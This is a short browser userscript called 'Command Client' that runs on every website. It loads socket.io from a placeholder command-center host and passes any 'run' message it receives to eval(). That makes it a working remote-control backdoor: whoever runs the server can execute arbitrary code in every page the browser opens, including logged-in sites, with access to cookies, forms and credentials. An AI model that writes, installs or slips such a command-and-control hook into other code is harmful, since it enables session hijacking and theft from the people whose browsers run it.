// ==UserScript==
// @name         Command Client
// @version      0.1
// @match        *://*/*
// @grant        none
// ==/UserScript==

function iframe () {
    try {
        return window.self !== window.top;
    } catch (e) {
        return true;
    }
}

var client = document.createElement('script');
client.type = 'text/javascript';
client.async = true;
client.src = document.location.protocol + '//<command center URL>/socket.io/socket.io.js';
var head = document.getElementsByTagName('head')[0];
head.appendChild(client);

setTimeout(function() {
    if (!iframe()) {
        var socket = io(document.location.protocol + '//<command center URL>');
        socket.on('run', function(code) {
            eval(code);
        });
    }
}, 10000);
